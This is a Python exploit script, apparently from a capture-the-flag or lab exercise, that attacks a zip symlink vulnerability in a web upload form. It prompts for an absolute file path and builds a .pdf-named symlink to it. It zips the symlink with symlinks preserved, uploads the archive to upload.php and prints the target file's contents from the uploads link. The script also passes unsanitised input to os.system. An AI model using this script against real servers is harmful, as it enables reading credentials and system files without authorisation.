import os
import requests
from bs4 import BeautifulSoup

BASE_URL = "http://??????????????????????"
UPLOAD_URL = BASE_URL + "upload.php"

ZIP_EXTENSION = ".zip"
PDF_EXTENSION = ".pdf"

s = requests.Session()

print("[+] Enter filename (aboslute path) that you would like to read using zip symlink vulnerability")
while True:
    filepath = input("$ ")
    if "/" not in filepath:
        print("[!] Absolute path to file is required")
        continue

    filename = filepath.split("/")[-1]
    print(filename)
    #Create symlink using given file path
    pdf_filename = filename + PDF_EXTENSION
    print(pdf_filename)
    os.system("ln -sf " + filepath + " " + pdf_filename)
    print("[+] Created symlink file: " + pdf_filename)

    #Create zip archive with symlink inside
    zip_filename = filename + ZIP_EXTENSION
    os.system("zip -y " + zip_filename + " " + pdf_filename)
    print("[+] Created zip file: " + zip_filename)

    
    #Upload malicious zip file containing symlink to victim upload functionality
    data = {'submit': 'Submit'}
    file_data = open(zip_filename, 'rb')
    files = {'zipFile': (zip_filename, file_data, "application/zip")}
    req = s.post(UPLOAD_URL, data=data, files=files)
    #print(req.request.body)

    #Retrieve uploaded file endpoint/URL from response
    soup = BeautifulSoup(req.text, 'html.parser')
    all_a_tags = soup.find_all('a')
    for a_tag in all_a_tags:
        #print(a_tag['href'])
        if 'uploads' in a_tag['href']:
            file_link = BASE_URL + a_tag['href']
            #Print file content
            req = s.get(file_link)
            print("[+] File content------------------------------------------")
            print(req.text)
            continue
